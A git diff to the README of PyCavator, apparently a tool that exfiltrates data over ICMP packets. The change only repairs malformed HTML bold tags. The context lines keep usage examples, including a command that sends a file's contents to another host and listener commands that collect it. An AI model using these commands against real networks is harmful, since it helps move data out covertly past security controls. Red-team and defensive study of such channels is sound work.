@@ -14,16 +14,16 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP packets i
 - All libraries are part of the default Python installation.<br/>
 
 #### Examples:
-  <bSender mode: exfiltrate data from a file</b><br/>
+  <b>Sender mode: exfiltrate data from a file</b><br/>
   python pycavator-icmp.py -f input.txt -d 192.168.1.101
   
-  <bListener mode: listen for incoming data and save in chunks</b><br/>
+  <b>Listener mode: listen for incoming data and save in chunks</b><br/>
   python pycavator-icmp.py -l -s 192.168.1.100 -w c
   
-  <bListener mode: listen for incoming data and save to a single file</b><br/>
+  <b>Listener mode: listen for incoming data and save to a single file</b><br/>
   python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
   
-  <bMerge mode: merge output files with part numbers in the specified range</b><br/>
+  <b>Merge mode: merge output files with part numbers in the specified range</b><br/>
   python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
 
 
